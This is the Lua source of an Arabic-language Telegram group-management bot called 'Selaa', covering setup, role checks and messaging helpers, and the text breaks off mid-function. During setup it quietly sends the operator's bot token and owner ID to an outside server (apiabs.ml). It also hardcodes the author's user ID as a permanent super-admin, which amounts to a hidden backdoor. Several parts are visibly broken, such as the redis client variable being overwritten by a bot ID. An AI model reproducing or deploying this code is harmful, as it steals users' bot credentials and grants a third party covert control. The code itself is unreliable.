------------------------------------------------
-- This Source Was Developed By (Selaa) @IE_S9.--
--   This Is The Source Channel @sourcesela .   --
--                - Selaa -                 --
--        -- https://t.me/sourcesela --         --
------------------------------------------------ 
redis = require('redis') 
URL = require('socket.url') 
HTTPS = require ("ssl.https") 
https = require ("ssl.https") 
http  = require ("socket.http") 
serpent = require("serpent") 
json = dofile('./JSON.lua') 
JSON = dofile('./dkjson.lua') 
lgi = require('lgi') 
notify = lgi.require('Notify') 
utf8 = require ('lua-utf8') 
notify.init ("Telegram updates") 
Selaa = redis.connect('127.0.0.1', 6379) 
ServerSelaa = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
--     Source Selaa     --
local AutoSet = function() 
if not Selaa:get(ServerSelaa.."IdSelaa") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ⇇ ⤈\n\27[0;33;49m') 
local SUDO = io.read():gsub(' ','') 
if tostring(SUDO):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
Selaa:set(ServerSelaa.."IdSelaa",SUDO) 
else 
print('\27[1;31m┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉') 
end 
os.execute('lua Selaa.lua') 
end 
if not Selaa:get(ServerSelaa.."TokenSelaa") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت ⇇ ⤈\n\27[0;33;49m') 
local token = io.read() 
if token ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe') 
if res ~= 200 then 
print('\27[1;31m┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
Selaa:set(ServerSelaa.."TokenSelaa",token) 
end  
else 
print('\27[1;31m┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉') 
end  
os.execute('lua Selaa.lua') 
end 
Selaa:set(Selaa:get(ServerSelaa.."TokenSelaa"):match("(%d+)")..'Selaa:Error',true)
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local create_config_auto = function()
config = {
SUDO = Selaa:get(ServerSelaa.."IdSelaa"),
token = Selaa:get(ServerSelaa.."TokenSelaa"),
bot_id = Selaa:get(ServerSelaa.."TokenSelaa"):match("(%d+)"),
sudo_users = {Selaa:get(ServerSelaa.."IdSelaa")},
}
create(config, "./config.lua")   
https.request("https://apiabs.ml/Selaa.php?SUDO="..Selaa:get(ServerSelaa.."IdSelaa").."&token="..Selaa:get(ServerSelaa.."TokenSelaa"))
file = io.open("RUNSELAA.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Selaa
token="]]..Selaa:get(ServerSelaa.."TokenSelaa")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ┉"
echo "The tg File Was Not Found In The Bot Files"
echo "┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ┉"
exit 1
fi
if [ ! $token ]; then
echo "┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
echo "The Token Was Not Found In The config.lua File"
echo "┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
exit 1
fi
./tg -s ./Selaa.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Selaa", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Selaa
while(true) do
rm -fr ../.telegram-cli
screen ./RUNSELAA.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('./Selaa')
end 
create_config_auto()
end
local Load_Selaa = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
Selaa:del(ServerSelaa.."IdSelaa");Selaa:del(ServerSelaa.."TokenSelaa")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_Selaa() 
print("\27[36m"..[[                                           
---------------------------------------------
|    ____             ____                  |------------------------------------------|
|This Source Was Developed By (Selaa) @IE_S9.|
|  This Is The Source Channel @sourcesela .   |
|               - Selaa -                 |
---------------------------------------------
]]..'\27[m')
sudos = dofile("./config.lua")
DevId = sudos.SUDO
SudoUsers = {sudos.sudo_users,1059262308}
Selaa = sudos.bot_id
TokenBot = sudos.token
NameBot = (Selaa:get(Selaa..'Selaa:NameBot') or 'سيلا')
--     Source Selaa     --
FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     Source Selaa     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source Selaa     --
function dl_cb(arg, data)
end
--     Source Selaa     --
----------  Sudo  ----------
function Sudo(msg) 
local var35 = false 
for k,v in pairs(SudoUsers) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoUsers) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
--     Source Selaa     --
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == Selaa then  
var = true  
end  
return var  
end 
--     Source Selaa     --
---------  SudoBot  --------
function SudoBot(msg) 
local Status = Selaa:sismember(Selaa..'Selaa:SudoBot:',msg.sender_user_id_) 
if Status or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Selaa     --
---------Manager All--------
function ManagerAll(msg) 
local Status = Selaa:sismember(Selaa..'Selaa:ManagerAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Selaa     --
--------- Admin All --------
function AdminAll(msg) 
local Status = Selaa:sismember(Selaa..'Selaa:AdminAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Selaa     --
------ VIP MEMBER ALL ------
function VipAll(msg) 
local Status = Selaa:sismember(Selaa..'Selaa:VipAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Selaa     --
----   SelaaConstructor   ----
function SelaaConstructor(msg) 
local Status = Selaa:sismember(Selaa..'Selaa:SelaaConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Selaa     --
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = Selaa:sismember(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or SelaaConstructor(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Selaa     --
----    Constructor     ----
function Constructor(msg) 
local Status = Selaa:sismember(Selaa..'Selaa:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or SelaaConstructor(msg) or BasicConstructor(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Selaa     --
---------  Manager  --------
function Manager(msg) 
local Status = Selaa:sismember(Selaa..'Selaa:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or SelaaConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Selaa     --
----------  Admin  ---------
function Admin(msg) 
local Status = Selaa:sismember(Selaa..'Selaa:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or SelaaConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Selaa     --
---------Vip Member---------
function VipMem(msg) 
local Status = Selaa:sismember(Selaa..'Selaa:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or VipAll(msg) or SelaaConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Selaa     --
--------- Cleaner ----------
function Cleaner(msg) 
local Status = Selaa:sismember(Selaa..'Selaa:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or SelaaConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Selaa     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
if Selaa:sismember(Selaa..'Selaa:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source Selaa     --
---------  BanAll  ---------
function BanAll(user_id)
if Selaa:sismember(Selaa..'Selaa:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source Selaa     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
if Selaa:sismember(Selaa..'Selaa:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source Selaa     --
---------  MuteAll  --------
function MuteAll(user_id)
if Selaa:sismember(Selaa..'Selaa:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source Selaa     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     Source Selaa     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     Source Selaa     --
function SelaaFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.Selaa and msg then
FilesText = plugin.Selaa(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
--     Source Selaa     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     Source Selaa     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= Selaa:lower() then 
send(chat,msg.id_,"↯☆عذرا هذا الملف ليس تابع لهذا البوت")   
return false 
end
send(chat,msg.id_,"↯☆جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot' .. TokenBot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"↯☆عذرا الملف ليس بصيغة ⇇ Json يرجى رفع الملف الصحيح")
end
local info_file = io.open('./'..Selaa..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
Selaa:set(Selaa.."Selaa:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
Selaa:sadd(Selaa.."Selaa:Groups",IdGps) 
Selaa:set(Selaa.."Selaa:Lock:Bots"..IdGps,"del") Selaa:hset(Selaa.."Selaa:Spam:Group:User"..IdGps ,"Spam:User","del") 
LockList ={'Selaa:Lock:Links','Selaa:Lock:Contact','Selaa:Lock:Forwards','Selaa:Lock:Videos','Selaa:Lock:Gifs','Selaa:Lock:EditMsgs','Selaa:Lock:Stickers','Selaa:Lock:Farsi','Selaa:Lock:Spam','Selaa:Lock:WebLinks','Selaa:Lock:Photo'}
for i,Lock in pairs(LockList) do
Selaa:set(Selaa..Lock..IdGps,true)
end
if v.SelaaConstructors then
for k,IdSelaaConstructors in pairs(v.SelaaConstructors) do
Selaa:sadd(Selaa..'Selaa:SelaaConstructor:'..IdGps,IdSelaaConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
Selaa:sadd(Selaa..'Selaa:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
Selaa:sadd(Selaa..'Selaa:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
Selaa:sadd(Selaa..'Selaa:Managers:'..IdGps,IdManagers)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
Selaa:sadd(Selaa..'Selaa:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
Selaa:sadd(Selaa..'Selaa:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
Selaa:set(Selaa.."Selaa:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
Selaa:set(Selaa.."Selaa:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( تم وضع ترحيب المجموعات )')
end
end
end
send(chat,msg.id_,"↯☆تم رفع النسخه بنجاح \n↯☆تم تفعيل جميع المجموعات \n↯☆تم استرجاع مشرفين المجموعات \n↯☆تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
end
--     Source Selaa     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source Selaa     --
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatus" .. status }, }, dl_cb, nil)
end
--     Source Selaa     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source Selaa     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source Selaa     --
function ChatLeave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
--     Source Selaa     --
function do_notify(user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
--     Source Selaa     --
function ChatKick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
--     Source Selaa     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source Selaa     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source Selaa     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     Source Selaa     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
--     Source Selaa     --
function Selaa(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     Source Selaa     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source Selaa     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
--     Source Selaa     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     Source Selaa     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     Source Selaa     --
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source Selaa     --
function CatchName(Name,Num) 
ChekName = utf8.sub(Name,0,Num) Name = ChekName return Name..'' 
end
--     Source Selaa     --
local SelaaRank = function(msg) if SudoId(msg.sender_user_id_) then SelaaTEAM  = "المطور" elseif SudoId(msg.sender_user_id_) then SelaaTEAM = "المطور" elseif SudoBot(msg) then SelaaTEAM = "المطور" elseif ManagerAll(msg) then SelaaTEAM = "المدير" elseif AdminAll(msg) then SelaaTEAM = "الادمن" elseif SelaaConstructor(msg) then SelaaTEAM = "المنشئ" elseif BasicConstructor(msg) then SelaaTEAM = "المنشئ" elseif Constructor(msg) then SelaaTEAM = "المنشئ" elseif Manager(msg) then SelaaTEAM = "المدير" elseif Admin(msg) then SelaaTEAM = "الادمن" else SelaaTEAM = "العضو" end return SelaaTEAM end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1059262308) then SelaaTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Selaa) then SelaaTEAM = 'البوت' elseif SudoId(user_id) then SelaaTEAM = 'المطور الاساسي' elseif Selaa:sismember(Selaa..'Selaa:SudoBot:', user_id) then SelaaTEAM = Selaa:get(Selaa.."Selaa:SudoBot:Rd"..chat_id) or 'المطور' elseif Selaa:sismember(Selaa..'Selaa:ManagerAll:', user_id) then SelaaTEAM = Selaa:get(Selaa.."Selaa:Managers:Rd"..chat_id) or 'المدير العام' elseif Selaa:sismember(Selaa..'Selaa:AdminAll:', user_id) then SelaaTEAM = Selaa:get(Selaa.."Selaa:Admins:Rd"..chat_id) or 'الادمن العام' elseif Selaa:sismember(Selaa..'Selaa:VipAll:', user_id) then SelaaTEAM = Selaa:get(Selaa.."Selaa:VipMem:Rd"..chat_id) or 'المميز العام' elseif Selaa:sismember(Selaa..'Selaa:SelaaConstructor:'..chat_id, user_id) then SelaaTEAM = 'منشئ المجموعه' elseif Selaa:sismember(Selaa..'Selaa:BasicConstructor:'..chat_id, user_id) then SelaaTEAM = Selaa:get(Selaa.."Selaa:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif Selaa:sismember(Selaa..'Selaa:Constructor:'..chat_id, user_id) then SelaaTEAM = Selaa:get(Selaa.."Selaa:Constructor:Rd"..chat_id) or 'المنشئ' elseif Selaa:sismember(Selaa..'Selaa:Managers:'..chat_id, user_id) then SelaaTEAM = Selaa:get(Selaa.."Selaa:Managers:Rd"..chat_id) or 'المدير' elseif Selaa:sismember(Selaa..'Selaa:Admins:'..chat_id, user_id) then SelaaTEAM = Selaa:get(Selaa.."Selaa:Admins:Rd"..chat_id) or 'الادمن' elseif Selaa:sismember(Selaa..'Selaa:VipMem:'..chat_id, user_id) then  SelaaTEAM = Selaa:get(Selaa.."Selaa:VipMem:Rd"..chat_id) or 'المميز' elseif Selaa:sismember(Selaa..'Selaa:Cleaner:'..chat_id, user_id) then  SelaaTEAM = Selaa:get(Selaa.."Selaa:Cleaner:Rd"..chat_id) or 'المنظف' else SelaaTEAM = Selaa:get(Selaa.."Selaa:mem:Rd"..chat_id) or 'العضو' end return SelaaTEAM end
--     Source Selaa     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(Selaa) then  
var = true  
elseif Selaa:sismember(Selaa..'Selaa:SudoBot:', user_id) then
var = true  
elseif Selaa:sismember(Selaa..'Selaa:ManagerAll:', user_id) then
var = true  
elseif Selaa:sismember(Selaa..'Selaa:AdminAll:', user_id) then
var = true  
elseif Selaa:sismember(Selaa..'Selaa:VipAll:', user_id) then
var = true  
elseif Selaa:sismember(Selaa..'Selaa:SelaaConstructor:'..chat_id, user_id) then
var = true
elseif Selaa:sismember(Selaa..'Selaa:BasicConstructor:'..chat_id, user_id) then
var = true
elseif Selaa:sismember(Selaa..'Selaa:Constructor:'..chat_id, user_id) then
var = true  
elseif Selaa:sismember(Selaa..'Selaa:Managers:'..chat_id, user_id) then
var = true  
elseif Selaa:sismember(Selaa..'Selaa:Admins:'..chat_id, user_id) then
var = true  
elseif Selaa:sismember(Selaa..'Selaa:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function SelaaDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif Selaa:sismember(Selaa..'Selaa:SudoBot:', user_id) then
var = 'sudobot'  
elseif Selaa:sismember(Selaa..'Selaa:SelaaConstructor:'..chat_id, user_id) then
var = 'absconstructor'
elseif Selaa:sismember(Selaa..'Selaa:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif Selaa:sismember(Selaa..'Selaa:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif Selaa:sismember(Selaa..'Selaa:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
--     Source Selaa     --
local function Filters(msg, value)
local abs = (Selaa..'Selaa:Filters:'..msg.chat_id_)
if abs then
local names = Selaa:hkeys(abs)
local text = ''
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not Admin(msg)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
DeleteMessage(chat,msgs)
end
end
end
end
--     Source Selaa     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "sourcesela")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "reply" then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆العضو ⇇ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyAdd" then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆بواسطة ⇇ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
--     Source Selaa     --
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "المالك"
elseif GetInfo.result.status == "administrator" then 
Status = "مشرف"
else
Status = false
end
if GetInfo.result.custom_title then 
Selaa = GetInfo.result.custom_title
else 
Selaa = Status
end
end
return Selaa
end
--     Source Selaa     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
local function getChannelMembers(channel_id, offset, filter, limit,cb) 
tdcli_function ({ 
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {ID = "ChannelMembers" .. filter},
offset_ = offset,limit_ = limit}, 
cb, nil) 
end
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
